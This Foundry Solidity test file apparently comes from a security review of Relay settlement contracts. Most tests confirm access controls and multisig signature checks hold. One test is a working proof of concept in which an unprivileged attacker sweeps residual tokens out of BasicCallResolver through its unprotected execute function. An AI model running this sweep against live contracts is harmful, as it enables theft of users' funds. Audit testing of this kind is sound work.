// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {RelayHub} from "relay-settlement/RelayHub.sol";
import {
  RelayAllocator,
  BuildPayloadParams,
  IPayloadBuilder
} from "relay-settlement/RelayAllocator.sol";
import {RelayOracleMultisig} from "relay-settlement/RelayOracleMultisig.sol";
import {WithdrawGasPayer} from "relay-settlement/WithdrawGasPayer.sol";
import {RelayDepository} from "relay-depository/RelayDepository.sol";
import {Call, CallRequest} from "relay-depository/utils/RelayDepositoryStructs.sol";
import {BasicCallResolver} from "relay-settlement/call-resolvers/BasicCallResolver.sol";
import {ExecuteAndWithdrawRequest} from "relay-settlement/call-resolvers/ICallResolver.sol";
import {MockERC20, MockPayloadBuilder, HubMinter} from "../src/Mocks.sol";

/// @notice P4 access-control PoCs for Relay settlement.
/// Attacker is always a fresh, unprivileged EOA with no roles.
contract P4AccessTest is Test {
  // --- actors ---
  address admin = address(this); // test contract deploys everything, holds ADMIN_ROLEs
  address attacker = makeAddr("attacker");
  address spender = makeAddr("spender");
  address spender2 = makeAddr("spender2");
  address receiver = makeAddr("receiver");

  // --- core contracts ---
  RelayHub hub;
  RelayAllocator allocator;
  RelayOracleMultisig multisig;
  MockPayloadBuilder builder;
  HubMinter minter;

  // --- multisig keys (5 signers, threshold 2) ---
  uint256[5] pks = [uint256(0x1111), 0x2222, 0x3333, 0x4444, 0x5555];
  address[5] signers;

  uint256 constant TOKEN_ID_ETH_USDC =
    0xac2b4d7ea2ef3b0280960d175a1ef9d95c7a94bc4f1b058e8179853a7a174a0d;

  function setUp() public {
    for (uint256 i; i < 5; i++) signers[i] = vm.addr(pks[i]);
    // sort signers ascending for multisig signature order
    for (uint256 i; i < 5; i++) {
      for (uint256 j = i + 1; j < 5; j++) {
        if (signers[j] < signers[i]) {
          (signers[i], signers[j]) = (signers[j], signers[i]);
          (pks[i], pks[j]) = (pks[j], pks[i]);
        }
      }
    }
    address[] memory s = new address[](5);
    for (uint256 i; i < 5; i++) s[i] = signers[i];
    multisig = new RelayOracleMultisig(admin, s, 2);

    hub = new RelayHub(admin);
    minter = new HubMinter(hub);
    hub.grantRole(hub.OPERATOR_ROLE(), address(minter));

    allocator = new RelayAllocator(admin, address(hub), address(multisig));
    hub.grantRole(hub.OPERATOR_ROLE(), address(allocator));
    builder = new MockPayloadBuilder();
    allocator.setPayloadBuilder("1", abi.encodePacked(address(0xBEEF)), address(builder));
  }

  function aliasOf(address who) internal pure returns (address) {
    return address(uint160(uint256(keccak256(abi.encodePacked("1", abi.encodePacked(who))))));
  }

  function tokenId(address currency) internal pure returns (uint256) {
    return uint256(keccak256(abi.encodePacked("1", abi.encodePacked(currency))));
  }

  function withdrawReq(
    address _spender,
    uint256 amount,
    bytes32 nonce
  ) internal view returns (RelayAllocator.WithdrawRequest memory r) {
    r = RelayAllocator.WithdrawRequest({
      chainId: "1",
      depository: abi.encodePacked(address(0xBEEF)),
      currency: abi.encodePacked(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)),
      amount: amount,
      spenderChainId: "1",
      spender: abi.encodePacked(_spender),
      receiver: abi.encodePacked(receiver),
      data: "",
      nonce: nonce
    });
  }

  // ============ C1: suspend() is effective — no bypass for the suspended spender ============
  function test_suspendBlocksSubmitAndNoBypass() public {
    address aliasAddr = aliasOf(spender);
    uint256 tid = tokenId(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    minter.mintTo(aliasAddr, tid, 1_000_000);

    // Legit submit works pre-suspension.
    vm.prank(spender);
    allocator.submitWithdrawRequest(withdrawReq(spender, 400_000, bytes32(uint256(1))));
    assertEq(hub.balanceOf(aliasAddr, tid), 600_000);

    // Admin suspends the alias.
    allocator.suspend(aliasAddr);
    assertTrue(allocator.suspended(aliasAddr));

    // (a) A second submit by the suspended spender reverts.
    vm.prank(spender);
    vm.expectRevert(
      abi.encodeWithSelector(RelayAllocator.SpenderSuspended.selector, aliasAddr)
    );
    allocator.submitWithdrawRequest(withdrawReq(spender, 100_000, bytes32(uint256(2))));

    // (b) The spender EOA cannot move the alias balance via Hub.transferFrom
    // (it is not the alias, holds no allowance, and is not an operator).
    vm.prank(spender);
    vm.expectRevert();
    hub.transferFrom(aliasAddr, attacker, tid, 100_000);

    // (c) A fresh identity maps to a different (empty) alias: the balance is
    // bound to the suspended alias and cannot be reached under a new name.
    address alias2 = aliasOf(spender2);
    assertTrue(alias2 != aliasAddr);
    assertEq(hub.balanceOf(alias2, tid), 0);
    vm.prank(spender2);
    vm.expectRevert(); // Hub._burn underflows on the empty alias balance
    allocator.submitWithdrawRequest(withdrawReq(spender2, 100_000, bytes32(uint256(3))));

    // (d) The in-flight payload built BEFORE suspension is still stored
    // on-chain (suspension gates new submits only; signing is off-chain Lit).
    // This is a design note, not a bypass: the Hub burn already happened.
    bytes32 h1 = keccak256(abi.encode(withdrawReq(spender, 400_000, bytes32(uint256(1)))));
    assertGt(allocator.payloads(h1).length, 0);
    assertEq(hub.balanceOf(aliasAddr, tid), 600_000, "suspended balance intact");
  }

  // ============ C2: OracleMultisig threshold-2 holds ============
  function _sig2(bytes32 digest) internal returns (bytes memory) {
    (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(pks[0], digest);
    (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(pks[1], digest);
    return abi.encodePacked(r1, s1, v1, r2, s2, v2);
  }

  function test_multisigThresholdEnforced() public {
    bytes32 digest = keccak256("p4-test-digest");
    bytes4 magic = multisig.isValidSignature(digest, _sig2(digest));
    assertEq(magic, bytes4(0x1626ba7e), "2 valid sorted sigs must validate");

    // 1 signature only -> invalid
    (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(pks[0], digest);
    assertEq(
      multisig.isValidSignature(digest, abi.encodePacked(r1, s1, v1)),
      bytes4(0),
      "1-of-5 must not meet threshold 2"
    );

    // unsorted (descending) -> invalid
    (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(pks[1], digest);
    assertEq(
      multisig.isValidSignature(digest, abi.encodePacked(r2, s2, v2, r1, s1, v1)),
      bytes4(0),
      "unsorted sigs must be rejected"
    );

    // duplicate signer twice -> invalid
    assertEq(
      multisig.isValidSignature(digest, abi.encodePacked(r1, s1, v1, r1, s1, v1)),
      bytes4(0),
      "duplicate signer must be rejected"
    );

    // non-signer -> invalid
    (uint8 vX, bytes32 rX, bytes32 sX) = vm.sign(0x9999, digest);
    assertEq(
      multisig.isValidSignature(digest, abi.encodePacked(r1, s1, v1, rX, sX, vX)),
      bytes4(0),
      "non-signer must be rejected"
    );

    // malleable twin (s' = n - s, v flipped) of a valid sig -> invalid (OZ rejects high-s)
    uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    uint256 s1m = n - uint256(s1);
    uint8 v1m = v1 == 27 ? 28 : 27;
    assertEq(
      multisig.isValidSignature(
        digest, abi.encodePacked(r1, bytes32(s1m), v1m, r2, s2, v2)
      ),
      bytes4(0),
      "malleable high-s twin must be rejected"
    );

    // signatures over digest D do NOT validate a different digest D' (no cross-payload reuse)
    bytes32 other = keccak256("different-payload");
    assertEq(
      multisig.isValidSignature(other, _sig2(digest)),
      bytes4(0),
      "sigs must not transfer across digests"
    );
  }

  // ============ C5: Depository setAllocator rotation invalidates old-allocator sigs ============
  function test_depositoryRotationInvalidatesOldAllocator() public {
    MockERC20 token = new MockERC20();
    uint256 pkA = 0xA11CE1;
    uint256 pkB = 0xB11CE2;
    address allocA = vm.addr(pkA);
    address allocB = vm.addr(pkB);
    RelayDepository dep = new RelayDepository(admin, allocA);
    token.mint(address(dep), 1_000_000);

    Call[] memory calls = new Call[](1);
    calls[0] = Call({
      to: address(token),
      data: abi.encodeCall(MockERC20.transfer, (attacker, 100_000)),
      value: 0,
      allowFailure: false
    });

    // helper to build + sign a request for this depository
    CallRequest memory req = CallRequest({
      calls: calls,
      nonce: 1,
      expiration: block.timestamp + 1 days
    });
    bytes memory sigA = _signDepository(dep, req, pkA);

    // Old allocator's signature executes before rotation.
    dep.execute(req, sigA);
    assertEq(token.balanceOf(attacker), 100_000);

    // Rotate allocator.
    dep.setAllocator(allocB);
    assertEq(dep.allocator(), allocB);

    // Same request shape, fresh nonce, still signed by OLD allocator -> reverts.
    CallRequest memory req2 = CallRequest({calls: calls, nonce: 2, expiration: block.timestamp + 1 days});
    bytes memory sigA2 = _signDepository(dep, req2, pkA);
    vm.expectRevert(RelayDepository.InvalidSignature.selector);
    dep.execute(req2, sigA2);

    // New allocator's signature works.
    dep.execute(req2, _signDepository(dep, req2, pkB));
    assertEq(token.balanceOf(attacker), 200_000);

    // Cross-contract replay: a signature for dep does not execute on a
    // second Depository deployment (domain separator binds verifyingContract).
    RelayDepository dep2 = new RelayDepository(admin, allocA);
    token.mint(address(dep2), 1_000_000);
    CallRequest memory req3 = CallRequest({calls: calls, nonce: 3, expiration: block.timestamp + 1 days});
    bytes memory sigDepForDep2 = _signDepository(dep, req3, pkA);
    vm.expectRevert(RelayDepository.InvalidSignature.selector);
    dep2.execute(req3, sigDepForDep2);
  }

  function _signDepository(
    RelayDepository dep,
    CallRequest memory req,
    uint256 pk
  ) internal view returns (bytes memory) {
    bytes32[] memory callHashes = new bytes32[](req.calls.length);
    for (uint256 i; i < req.calls.length; i++) {
      callHashes[i] = keccak256(
        abi.encode(
          dep._CALL_TYPEHASH(),
          req.calls[i].to,
          keccak256(req.calls[i].data),
          req.calls[i].value,
          req.calls[i].allowFailure
        )
      );
    }
    bytes32 structHash = keccak256(
      abi.encode(
        dep._CALL_REQUEST_TYPEHASH(),
        keccak256(abi.encodePacked(callHashes)),
        req.nonce,
        req.expiration
      )
    );
    bytes32 domainSeparator = keccak256(
      abi.encode(
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
        keccak256(bytes("RelayDepository")),
        keccak256(bytes("1")),
        block.chainid,
        address(dep)
      )
    );
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest);
    return abi.encodePacked(r, s, v);
  }

  // ============ VALIDATED: BasicCallResolver.execute has no access control ============
  function test_basicCallResolverSweepByAnyone() public {
    BasicCallResolver resolver = new BasicCallResolver(address(hub));
    uint256 amount = 777_000;
    // Model post-execution residue: the Executor funded the resolver and the
    // solver's sweeps did not cover this tokenId (leftover stays in resolver).
    hub.grantRole(hub.OPERATOR_ROLE(), address(this));
    hub.mint(address(resolver), TOKEN_ID_ETH_USDC, amount);
    assertEq(hub.balanceOf(address(resolver), TOKEN_ID_ETH_USDC), amount);

    // Attacker: fresh EOA, holds NO role anywhere.
    assertFalse(hub.hasRole(hub.OPERATOR_ROLE(), attacker));
    assertFalse(hub.hasRole(hub.ADMIN_ROLE(), attacker));

    // Attacker calls execute() directly with an empty request and a sweep
    // sending the resolver's full balance to themselves.
    BasicCallResolver.Call[] memory calls = new BasicCallResolver.Call[](0);
    BasicCallResolver.Sweep[] memory sweeps = new BasicCallResolver.Sweep[](1);
    sweeps[0] = BasicCallResolver.Sweep({recipient: attacker, tokenId: TOKEN_ID_ETH_USDC});
    ExecuteAndWithdrawRequest memory req;
    vm.prank(attacker);
    resolver.execute(req, false, abi.encode(calls, sweeps));

    assertEq(hub.balanceOf(attacker, TOKEN_ID_ETH_USDC), amount, "attacker swept residue");
    assertEq(hub.balanceOf(address(resolver), TOKEN_ID_ETH_USDC), 0);
  }

  // ============ WATCH: WithdrawGasPayer.payGas is bricked without OPERATOR_ROLE ============
  function test_withdrawGasPayerBrickedWithoutOperatorRole() public {
    WithdrawGasPayer payer = new WithdrawGasPayer(address(hub), address(multisig));
    // Live state (verified 2026-11-17): GasPayer holds NO OPERATOR_ROLE on Hub.
    assertFalse(hub.hasRole(hub.OPERATOR_ROLE(), address(payer)));

    address feeSpender = makeAddr("feeSpender");
    address aliasAddr = aliasOf(feeSpender);
    address feeToken = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    uint256 feeTid = tokenId(feeToken);
    minter.mintTo(aliasAddr, feeTid, 50_000);

    RelayAllocator.WithdrawRequest memory req = withdrawReq(feeSpender, 10_000, bytes32(uint256(9)));
    bytes memory feeCurrency = abi.encodePacked(feeToken);
    uint256 feeAmount = 5_000;
    bytes32 digest = _payGasDigest(address(payer), req, feeCurrency, feeAmount);
    bytes memory sig = _sig2(digest);

    // Valid 2-of-5 oracle signature, yet payGas reverts: Hub.burn is
    // onlyRole(OPERATOR_ROLE) and the payer was never granted it.
    vm.expectRevert(
      abi.encodeWithSelector(
        bytes4(keccak256("AccessControlUnauthorizedAccount(address,bytes32)")),
        address(payer),
        hub.OPERATOR_ROLE()
      )
    );
    payer.payGas(req, feeCurrency, feeAmount, sig);

    // Granting the role (the step DeployWithdrawGasPayer.s.sol says must be
    // done after deployment) makes the exact same call succeed — proving the
    // missing grant is the sole cause.
    hub.grantRole(hub.OPERATOR_ROLE(), address(payer));
    payer.payGas(req, feeCurrency, feeAmount, sig);
    bytes32 paramsHash = payer.hashWithdrawParams("1", abi.encodePacked(address(0xBEEF)), BuildPayloadParams({
      currency: req.currency,
      amount: req.amount,
      receiver: req.receiver,
      nonce: uint256(req.nonce),
      data: req.data
    }));
    assertEq(payer.gasPayments(paramsHash), feeAmount);
    assertEq(hub.balanceOf(aliasAddr, feeTid), 45_000);
  }

  function _payGasDigest(
    address payer,
    RelayAllocator.WithdrawRequest memory req,
    bytes memory feeCurrency,
    uint256 feeAmount
  ) internal view returns (bytes32) {
    bytes32 typehash = keccak256(
      "PayGas(string chainId,bytes depository,bytes currency,uint256 amount,string spenderChainId,bytes spender,bytes receiver,bytes data,bytes32 nonce,bytes feeCurrency,uint256 feeAmount)"
    );
    bytes32 structHash = keccak256(
      abi.encode(
        typehash,
        keccak256(bytes(req.chainId)),
        keccak256(req.depository),
        keccak256(req.currency),
        req.amount,
        keccak256(bytes(req.spenderChainId)),
        keccak256(req.spender),
        keccak256(req.receiver),
        keccak256(req.data),
        req.nonce,
        keccak256(feeCurrency),
        feeAmount
      )
    );
    bytes32 domainSeparator = keccak256(
      abi.encode(
        keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
        keccak256(bytes("WithdrawGasPayer")),
        keccak256(bytes("1")),
        block.chainid,
        payer
      )
    );
    return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
  }
}
